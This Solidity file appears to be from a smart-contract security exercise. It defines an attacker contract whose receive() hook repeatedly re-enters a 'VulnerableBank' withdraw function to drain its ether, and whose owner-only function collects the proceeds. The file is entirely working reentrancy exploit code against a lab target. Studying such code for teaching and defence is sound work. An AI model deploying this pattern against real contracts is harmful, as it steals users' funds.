//SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import "../src/VulnerableBank.sol";
import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract Attack is Ownable {
    VulnerableBank vulnerableBank;

    constructor(address vulnerableBankAddress_) Ownable(msg.sender) {
        vulnerableBank = VulnerableBank(vulnerableBankAddress_);
    }

    function getFunds(uint256 amount_) public {
        vulnerableBank.deposit{value: amount_}();
        vulnerableBank.withdraw();
    }

    function withdrawFunds() external onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Tx Failed");
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }
}
